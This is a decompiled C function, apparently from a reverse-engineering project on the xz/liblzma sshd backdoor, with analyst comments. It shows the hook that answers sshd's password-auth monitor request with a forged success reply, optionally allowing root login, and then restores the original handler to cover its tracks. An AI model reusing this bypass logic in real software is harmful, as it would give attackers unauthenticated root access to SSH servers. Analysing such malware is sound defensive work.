// /home/kali/xzre-ghidra/xzregh/108100_mm_answer_authpassword_send_reply_hook.c
// Function: mm_answer_authpassword_send_reply_hook @ 0x108100
// Calling convention: __stdcall
// Prototype: int __stdcall mm_answer_authpassword_send_reply_hook(ssh * ssh, int sock, sshbuf * m)


/*
 * AutoDoc: Short-circuits `MONITOR_REQ_AUTHPASSWORD`: validates the ssh/monitor arguments, replays the payload-provided reply when
 * `pending_authpayload_len/pending_authpayload` are set, or synthesizes a minimal success frame on the stack when no body is queued
 * (big-endian length word, cached monitor answer reqtype, 1-byte TRUE auth result, plus an optional 32-bit root_allowed dword).
 * The reply is emitted via `fd_write_full()` and the saved dispatch entry is restored so sshd continues as if the original routine ran;
 * malformed inputs fall back to libc’s `exit(0)` so the monitor never stays half-patched.
 */

#include "xzre_types.h"

int mm_answer_authpassword_send_reply_hook(ssh *ssh,int sock,sshbuf *m)

{
  libc_imports_t *libc_imports;
  sshd_ctx_t *sshd_ctx;
  int result;
  size_t reply_len;
  void *reply_buf;
  uint reply_frame_len_be;
  uint reply_reqtype;
  u8 auth_ok;
  u32 root_allowed;
  
  reply_frame_len_be = 0;
  libc_imports = global_ctx->libc_imports;
  sshd_ctx = global_ctx->sshd_ctx;
  reply_reqtype = 0;
  auth_ok = 0;
  root_allowed = 0;
  // AutoDoc: Missing ssh or monitor arguments mean the hook can’t safely forge a reply—exit immediately to avoid corrupting sshd’s dispatcher.
  if ((m == (sshbuf *)0x0 || sock < 0) || (ssh == (ssh *)0x0)) {
    if ((libc_imports != (libc_imports_t *)0x0) && (libc_imports->exit != (pfn_exit_t)0x0)) {
      (*libc_imports->exit)(0);
    }
    result = 0;
  }
  else {
    reply_len = (size_t)sshd_ctx->pending_authpayload_len;
    // AutoDoc: When no payload queued an authpassword body, synthesize the minimal reply frame: monitor reqtype + auth_ok byte (+ optional root_allowed dword).
    if ((sshd_ctx->pending_authpayload_len == 0) ||
       (reply_buf = sshd_ctx->pending_authpayload, reply_buf == (uint *)0x0)) {
      reply_buf = &reply_frame_len_be;
      auth_ok = 1;
      reply_reqtype = sshd_ctx->monitor_reqtype_authpassword & 0xff;
      reply_frame_len_be = ((sshd_ctx->auth_root_allowed_flag == 0) ? AUTHREPLY_LEN_BE_NO_ROOT : AUTHREPLY_LEN_BE_WITH_ROOT);
      reply_len = (ulong)(reply_frame_len_be >> 0x18) + 4;
    }
    // AutoDoc: Whether the reply came from the payload or was synthesized on the stack, push it straight to the monitor socket so sshd never re-enters its password handler.
    fd_write_full(sock,reply_buf,reply_len,libc_imports);
    // AutoDoc: Restore the saved monitor dispatch entry so the next request drops back into sshd’s genuine `mm_answer_authpassword` implementation.
    *sshd_ctx->mm_answer_authpassword_slot = sshd_ctx->mm_answer_authpassword_start;
    result = 1;
  }
  return result;
}

